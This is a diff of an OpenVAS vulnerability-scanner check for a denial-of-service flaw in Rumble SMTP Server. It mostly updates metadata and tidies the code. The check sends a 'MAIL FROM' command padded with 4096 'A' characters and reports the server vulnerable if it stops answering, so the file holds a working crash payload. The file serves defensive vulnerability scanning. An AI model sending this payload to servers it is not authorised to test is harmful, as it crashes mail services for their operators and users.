@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_rumble_smtp_srv_mail_from_cmd_dos_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
+# $Id: gb_rumble_smtp_srv_mail_from_cmd_dos_vuln.nasl 13116 2019-01-17 09:58:55Z cfischer $
 #
 # Rumble SMTP Server 'MAIL FROM' Command Denial of Service Vulnerability
 #
@@ -27,69 +27,69 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802012");
-  script_version("$Revision: 11997 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
+  script_version("$Revision: 13116 $");
+  script_tag(name:"last_modification", value:"$Date: 2019-01-17 10:58:55 +0100 (Thu, 17 Jan 2019) $");
   script_tag(name:"creation_date", value:"2011-04-11 14:40:00 +0200 (Mon, 11 Apr 2011)");
   script_bugtraq_id(47070);
   script_tag(name:"cvss_base", value:"8.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
   script_name("Rumble SMTP Server 'MAIL FROM' Command Denial of Service Vulnerability");
-  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17070/");
-  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/99827/");
-
-  script_tag(name:"qod_type", value:"remote_banner");
   script_category(ACT_DENIAL);
   script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
   script_family("Denial of Service");
   script_dependencies("find_service.nasl", "smtpserver_detect.nasl");
   script_require_ports("Services/smtp", 25);
+
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17070/");
+  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/99827/");
+
   script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the
-application to crash.");
-  script_tag(name:"affected", value:"Rumble SMTP Server Version 0.25.2232, Other versions may also
-be affected.");
+  application to crash.");
+
+  script_tag(name:"affected", value:"Rumble SMTP Server Version 0.25.2232, other versions may also
+  be affected.");
+
   script_tag(name:"insight", value:"The flaw is due to an error while handling 'MAIL FROM' command,
-which can be exploited by remote attackers to crash an affected application by
-sending specially crafted 'MAIL FROM' command.");
+  which can be exploited by remote attackers to crash an affected application by
+  sending specially crafted 'MAIL FROM' command.");
+
   script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
   of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
   release, disable respective features, remove the product or replace the product by another one.");
+
   script_tag(name:"summary", value:"The host is running Rumble SMTP Server and is prone to denial of
-service vulnerability.");
+  service vulnerability.");
+
+  script_tag(name:"qod_type", value:"remote_banner");
   script_tag(name:"solution_type", value:"WillNotFix");
+
   exit(0);
 }
 
 include("smtp_func.inc");
 
-smtpPort = get_kb_item("Services/smtp");
-if(!smtpPort) {
-  smtpPort = 25;
-}
-
-if(!get_port_state(smtpPort)){
-  exit(0);
-}
-
+smtpPort = get_smtp_port(default:25);
 banner = get_smtp_banner(port:smtpPort);
-if(!banner || "ESMTPSA" >!< banner){
+if(!banner || "ESMTPSA" >!< banner)
   exit(0);
-}
 
-soc1 = smtp_open(port: smtpPort, helo: "mydomain.tld");
-if(!soc1){
+soc1 = smtp_open(port:smtpPort, data:"mydomain.tld");
+if(!soc1)
   exit(0);
-}
 
-crafted_data = 'MAIL FROM ' + crap(data: 'A',length:4096) + string("\r\n");
-send(socket: soc1, data: crafted_data);
+crafted_data = 'MAIL FROM ' + crap(data:'A',length:4096) + string("\r\n");
+send(socket:soc1, data:crafted_data);
 recv(socket:soc1, length:1024);
-smtp_close(socket:soc1);
 
 sleep(3);
 
-soc2 = smtp_open(port: smtpPort, helo: "mydomain.tld");
+soc2 = smtp_open(port:smtpPort, data:"mydomain.tld");
 if(!soc2) {
+  close(soc1);
   security_message(port:smtpPort);
   exit(0);
 }
-smtp_close(socket:soc2);
+
+smtp_close(socket:soc1, check_data:FALSE);
+smtp_close(socket:soc2, check_data:FALSE);
+exit(99);
